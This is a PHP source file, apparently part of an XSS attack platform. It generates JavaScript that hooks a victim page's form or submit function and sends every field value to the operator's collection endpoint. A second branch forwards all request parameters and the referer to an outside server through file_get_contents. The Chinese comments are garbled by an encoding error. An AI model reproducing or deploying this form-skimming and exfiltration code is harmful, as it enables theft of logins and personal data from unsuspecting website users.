<?php
/**
 * 	��ע�⡿��ע�⡿��ע�⡿ �ļ���δ�����ԣ�����Բ���ļ�������ע���·�����û�������ˡ�
 * @desc   ת���ļ�
 * @team   C0dePlay Team        
 * @author Yaseng WwW.Yaseng.Me [Yaseng@UAUC.NET]
 */
 ini_set('display_errors', 'Off');
 $id=$_GET['id'];
 if($_GET['y']){
     
 
    $funcname=$_GET['funcname'];
    $formname='"'.$_GET['formname'].'"';
    $formid='"'.$_GET['formid'].'"';
     
    echo "
    var  xurl='http://�滻���������/xform.php?id={$id}';
    var form= ( $formname ) ?  document.forms[$formname] :  document.getElementById($formid);
     
     
     
    ";
     
    if($funcname){
         
         
     echo 'function getForm(e){var t,n="",r="",i,s;for(t=0;t<e.length;t++){i=e[t];if(i.name!=""){if(i.type=="select-one")s=i.options[i.selectedIndex].value;else if(i.type=="checkbox"||i.type=="radio"){if(i.checked==0)continue;s=i.value}else{if(i.type=="button"||i.type=="submit"||i.type=="reset"||i.type=="image")continue;s=i.value}s=encodeURIComponent(s),n+=r+i.name+"="+s,r="&"}}return n} '."
     $funcname=xss.proxy($funcname,function(){
               xss.ajax(xurl,getForm(form));
           
        })"
     ;
         
         
         
         
         
         
    }else{
         
         
        echo 'xss.xform(form,xurl);';
         
    }
     
     
     
     
     
 }else{
     
     
     
 $url=$_SERVER['HTTP_REFERER'];
 $data="";
  foreach($_REQUEST as $k=>$v){
     
     
    $data.="|$k=$v";
     
  }
 
file_get_contents("http://�滻���������/xss.php?do=api&id={$id}&data={$data}&url={$url}");
 
 
 }
 
 
 
 
?>